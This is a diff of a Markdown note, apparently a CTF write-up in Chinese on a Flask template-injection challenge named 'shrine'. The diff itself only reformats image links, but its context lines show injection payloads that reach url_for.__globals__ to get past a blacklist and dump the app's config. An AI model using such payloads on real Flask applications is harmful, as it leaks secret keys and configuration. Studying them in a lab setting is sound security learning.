@@ -1,4 +1,4 @@
-![[Pasted image 20221129143404.png]]
+![](<./img/Pasted image 20221129143404.png>)
 
 ---
 首页长这样
@@ -44,12 +44,12 @@ return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
 ```python
 /shrine/{{url_for.__globals__}}
 ```
-![[Pasted image 20221129160253.png]]
+![](<./img/Pasted image 20221129160253.png>)
 
 ```python
 /shrine/{{url_for.__globals__['current_app'].config}}
 ```
 
-![[Pasted image 20221129160733.png]]
+![](<./img/Pasted image 20221129160733.png>)
 
 #Web #python #flask #SSTI #urlfor #globals #bypass 
